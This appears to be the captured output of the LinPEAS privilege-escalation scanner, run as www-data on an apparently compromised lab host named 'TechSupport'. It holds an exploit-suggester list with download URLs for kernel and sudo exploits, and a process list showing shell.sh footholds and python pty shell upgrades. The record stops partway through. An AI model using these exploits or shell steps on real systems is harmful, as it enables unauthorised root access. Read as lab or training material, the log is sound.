         \u2584\u2584                \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                  \u2584\u2584
         \u2584            \u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584
         \u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                                \u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584\u2584     \u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584      \u2584 \u2584\u2584
         \u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584        \u2584\u2584\u2584\u2584\u2584\u2584\u2584        \u2584\u2584\u2584\u2584\u2584     \u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584
          \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584        \u2584          \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584            \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
          \u2580\u2580\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2580\u2580\u2580\u2580\u2580\u2580
               \u2580\u2580\u2580\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2580\u2580
                     \u2580\u2580\u2580\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2580\u2580\u2580

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------|
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Basic information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                         \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
OS: Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: TechSupport
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories DONE

                                        \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 System Information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                        \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Operative system
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.7 LTS
Release:	16.04
Codename:	xenial

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sudo version
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.16

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 CVEs Check
Vulnerable to CVE-2021-4034



\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 PATH
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Date & uptime
Sun Apr 17 09:38:36 IST 2022
 09:38:36 up  1:17,  0 users,  load average: 1.19, 0.26, 0.09

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Any sd*/disk* disk in /dev? (limit 20)
disk

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Unmounted file-system?
\u255a Check if you can mount unmounted devices
/dev/mapper/TechSupport--vg-root	/	ext4	errors=remount-ro	0 1
UUID=c6bd84db-be16-42d1-8e6f-263f13be4e06	/boot	ext2	defaults	0 2
/dev/mapper/TechSupport--vg-swap_1	none	swap	sw	0 0

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Environment
\u255a Any private information inside environment variables?
HISTFILESIZE=0
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/subrion/uploads
HISTFILE=/dev/null

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching Signature verification failed in dmesg
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester
\u255a https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester 2
\u255a https://github.com/jondonas/linux-exploit-suggester-2
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Protections
\u2550\u2563 AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
\u2550\u2563 grsecurity present? ............ grsecurity Not Found
\u2550\u2563 PaX bins present? .............. PaX Not Found
\u2550\u2563 Execshield enabled? ............ Execshield Not Found
\u2550\u2563 SELinux enabled? ............... sestatus Not Found
\u2550\u2563 Is ASLR enabled? ............... Yes
\u2550\u2563 Printer? ....................... No
\u2550\u2563 Is this a virtual machine? ..... Yes (xen)

                                             \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                             \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container related tools present
/usr/bin/lxc
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container details
\u2550\u2563 Is this a container? ........... No
\u2550\u2563 Any running containers? ........ No


                          \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes, Crons, Timers, Services and Sockets \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                          \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Cleaned processes
\u255a Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root         1  0.1  0.5 119596  5748 ?        Ss   08:21   0:09 /sbin/init
root       370  0.0  0.2  28448  2720 ?        Ss   08:21   0:00 /lib/systemd/systemd-journald
root       404  0.0  0.1 102968  1508 ?        Ss   08:21   0:00 /sbin/lvmetad -f
root       437  0.0  0.3  44336  3692 ?        Ss   08:21   0:00 /lib/systemd/systemd-udevd
systemd+   646  0.0  0.2 100320  2364 ?        Ssl  08:21   0:00 /lib/systemd/systemd-timesyncd
  \u2514\u2500(Caps) 0x0000000002000000=cap_sys_time
root       829  0.0  0.2  29008  2392 ?        Ss   08:21   0:00 /usr/sbin/cron -f
root       843  0.0  0.1 613484  1864 ?        Ssl  08:21   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       851  0.0  0.1   4392  1268 ?        Ss   08:21   0:00 /usr/sbin/acpid
daemon[0m     858  0.0  0.1  26044  1956 ?        Ss   08:21   0:00 /usr/sbin/atd -f
root       879  0.0  0.1  20096  1180 ?        Ss   08:21   0:00 /lib/systemd/systemd-logind
message+   884  0.0  0.3  42900  3724 ?        Ss   08:21   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  \u2514\u2500(Caps) 0x0000000020000000=cap_audit_write
root       903  0.0  0.5 275768  5572 ?        Ssl  08:21   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog     906  0.0  0.3 256388  3088 ?        Ssl  08:21   0:00 /usr/sbin/rsyslogd -n
root       925  0.0  0.0  13368   160 ?        Ss   08:21   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root       944  0.0  0.5 277180  5804 ?        Ssl  08:21   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1013  0.0  1.5 337920 15568 ?        Ss   08:21   0:00 /usr/sbin/smbd -D
root      1031  0.0  0.5 329804  5848 ?        S    08:21   0:00  _ /usr/sbin/smbd -D
root      1122  0.0  0.6 337920  6980 ?        S    08:21   0:00  _ /usr/sbin/smbd -D
root      1045  0.0  0.2  16120  2892 ?        Ss   08:21   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root      1141  0.0  1.5 1232636 15740 ?       Ssl  08:21   0:00 /usr/bin/amazon-ssm-agent
root      1322  0.0  2.5 1320032 25824 ?       Sl   08:21   0:00  _ /usr/bin/ssm-agent-worker
root      1153  0.0  1.8 174632 19260 ?        Ssl  08:21   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1169  0.0  0.5  65512  5860 ?        Ss   08:21   0:00 /usr/sbin/sshd -D
root      1176  0.0  0.0   5216   152 ?        Ss   08:21   0:00 /sbin/iscsid
root      1183  0.0  0.3   5716  3524 ?        S<Ls 08:21   0:00 /sbin/iscsid
root      1260  0.0  0.1  15932  1432 tty1     Ss+  08:21   0:00 /sbin/agetty --noclear tty1 linux
root      1267  0.0  0.1  15748  1708 ttyS0    Ss+  08:21   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1345  0.0  0.2  21164  2048 ?        S    08:21   0:00 /bin/bash /usr/bin/mysqld_safe
mysql     1565  0.0  7.2 599680 73508 ?        Sl   08:21   0:02  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      1566  0.0  0.1  26088  1048 ?        S    08:21   0:00  _ logger -t mysqld -p daemon error
root      1405  0.0  2.9 530680 30168 ?        Ss   08:21   0:00 /usr/sbin/apache2 -k start
www-data  1429  0.0  2.7 534864 27992 ?        S    08:21   0:00  _ /usr/sbin/apache2 -k start
www-data  3094  0.0  0.0   4500   748 ?        S    09:38   0:00  |   _ sh -c ./linpeas.sh
www-data  3095  0.1  0.2   5424  2556 ?        S    09:38   0:00  |       _ /bin/sh ./linpeas.sh
www-data  7287  0.0  0.1   5424  1016 ?        S    09:38   0:00  |           _ /bin/sh ./linpeas.sh
www-data  7291  0.0  0.2  34556  3000 ?        R    09:38   0:00  |           |   _ ps fauxwww
www-data  7290  0.0  0.1   5424  1016 ?        S    09:38   0:00  |           _ /bin/sh ./linpeas.sh
www-data  1431  0.0  4.8 535556 48696 ?        S    08:21   0:00  _ /usr/sbin/apache2 -k start
www-data  3009  0.0  0.0   4500   700 ?        S    09:30   0:00  |   _ sh -c ./shell.sh
www-data  3010  0.0  0.0   1112     4 ?        Sl   09:30   0:00  |       _ ./shell.sh
www-data  1432  0.0  3.0 610332 31020 ?        S    08:21   0:00  _ /usr/sbin/apache2 -k start
www-data  3032  0.0  0.0   4500   712 ?        S    09:31   0:00  |   _ sh -c ./shell.sh
www-data  3033  0.0  0.0   1112     4 ?        Sl   09:31   0:00  |       _ ./shell.sh
www-data  1938  0.0  3.0 610408 30496 ?        S    08:39   0:00  _ /usr/sbin/apache2 -k start
www-data  2951  0.0  0.0   4500   848 ?        S    09:21   0:00  |   _ sh -c python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data  2952  0.0  0.8  35828  8440 ?        S    09:21   0:00  |       _ python3 -c import pty; pty.spawn("/bin/bash")
www-data  2953  0.0  0.2  18208  2056 pts/2    Ss+  09:21   0:00  |           _ /bin/bash
www-data  1942  0.0  4.4 535644 45192 ?        S    08:40   0:00  _ /usr/sbin/apache2 -k start
www-data  2907  0.0  0.0   4500   748 ?        S    09:19   0:00  |   _ sh -c python3 -c 'import pty; pty.spawn("/bin/sh")'
www-data  2908  0.0  0.8  35832  8400 ?        S    09:19   0:00  |       _ python3 -c import pty; pty.spawn("/bin/sh")
www-data  2909  0.0  0.0   4500   788 pts/1    Ss+  09:19   0:00  |           _ /bin/sh
www-data  1943  0.0  3.7 610768 37908 ?        S    08:40   0:00  _ /usr/sbin/apache2 -k start
www-data  1946  0.0  3.5 610732 36240 ?        S    08:40   0:00  _ /usr/sbin/apache2 -k start
www-data  2691  0.0  3.8 610828 39176 ?        S    09:03   0:00  _ /usr/sbin/apache2 -k start
www-data  2693  0.0  3.7 610784 37644 ?        S    09:04   0:00  _ /usr/sbin/apache2 -k start
www-data  2802  0.0  2.5 536636 25844 ?        S    09:14   0:00  _ /usr/sbin/apache2 -k start
www-data  2882  0.0  0.0   4500   848 ?        S    09:19   0:00  |   _ sh -c python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data  2883  0.0  0.8  35824  8356 ?        S    09:19   0:00  |       _ python3 -c import pty; pty.spawn("/bin/bash")
www-data  2884  0.0  0.1  18208  1956 pts/0    Ss+  09:19   0:00  |           _ /bin/bash
www-data  3037  0.0  1.4 531316 14908 ?        S    09:33   0:00  _ /usr/sbin/apache2 -k start
root      1553  0.0  0.8 287144  8620 ?        Ss   08:21   0:00 /usr/sbin/winbindd
root      1560  0.0  0.8 286840  9044 ?        S    08:21   0:00  _ /usr/sbin/winbindd
root      1959  0.0  0.4 287144  4080 ?        S    08:41   0:00  _ /usr/sbin/winbindd

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Binary processes permissions (non 'root root' and not belonging to current user)
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-rwxr-xr-x 1 root     root      1037528 Jul 13  2019 /bin/bash
lrwxrwxrwx 1 root     root            4 May 28  2021 /bin/sh -> dash
-rwxr-xr-x 1 root     root       326232 Apr 28  2020 /lib/systemd/systemd-journald
